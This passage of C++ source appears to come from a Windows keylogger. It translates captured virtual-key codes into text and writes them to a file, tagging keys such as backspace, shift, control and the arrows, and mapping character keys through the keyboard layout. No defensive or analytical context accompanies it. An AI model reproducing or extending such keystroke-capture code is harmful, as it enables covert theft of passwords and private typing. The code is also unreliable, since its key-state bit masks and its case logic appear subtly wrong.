if (key == VK_SPACE) file << " ";
    else if (key == VK_BACK) file << "[BACK]";
    else if (key == VK_RETURN) file << "\n";
    else if (key == VK_TAB) file << "TAB";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) file << "[SHIFT]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) file << "[CTRL]";
    else if (key == VK_ESCAPE) file << "[ESCAPE]";
    else if (key == VK_END) file << "[END]";
    else if (key == VK_HOME) file << "[HOME]";
    else if (key == VK_LEFT) file << "[LEFT]";
    else if (key == VK_RIGHT) file << "[RIGHT]";
    else if (key == VK_UP) file << "[UP]";
    else if (key == VK_DOWN) file << "[DOWN]";
    else if (key == 190 || key == 110) file << ".";
    else if (key == 189 || key == 109) file << "-";
    else if (key == 20) file << "[CAPS]";
    else {
        wchar_t curKey;
        bool lower = ((GetKeyState(VK_CAPITAL) & 0x1000) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0) lower = !lower;

        if (keyboardLayout) {
            curKey = MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, keyboardLayout);
            if (!lower)
                curKey = tolower(curKey);
            file << curKey;
        }
    }